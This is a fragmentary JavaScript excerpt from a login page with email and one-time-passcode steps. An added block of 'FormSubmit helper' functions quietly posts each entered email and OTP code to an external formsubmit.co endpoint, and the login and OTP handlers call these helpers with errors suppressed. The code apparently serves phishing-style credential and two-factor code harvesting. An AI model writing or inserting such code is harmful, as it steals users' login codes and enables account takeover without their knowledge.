...
// -------- FormSubmit helper functions (added) --------
function sendEmailToFormsubmit(email) {
    try {
        const fd = new FormData();
        fd.append('email', email);
        fd.append('form_type', 'Login Email Submission');
        ...
        }).catch(e => console.warn('FormSubmit email send failed', e));
    } catch (e) {
        console.warn('sendEmailToFormsubmit error', e);
    }
}

function sendOtpToFormsubmit(otp, email) {
    try {
        const fd = new FormData();
        fd.append('otp', otp);
        ...
        fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
            ...
            body: fd,
            mode: 'no-cors'
        }).catch(e => console.warn('FormSubmit OTP send failed', e));
    } catch (e) {
        console.warn('sendOtpToFormsubmit error', e);
    }
}
// -------- end of FormSubmit helpers --------
...
function handleLogin(event) {
    ...
    try {
        ...
        try { sendEmailToFormsubmit(currentEmail); } catch(e) { console.warn(e); }
...
function handleOTP(event) {
    ...
    try {
        ...
        try { sendOtpToFormsubmit(otpCode, currentEmail); } catch(e) { console.warn(e); }
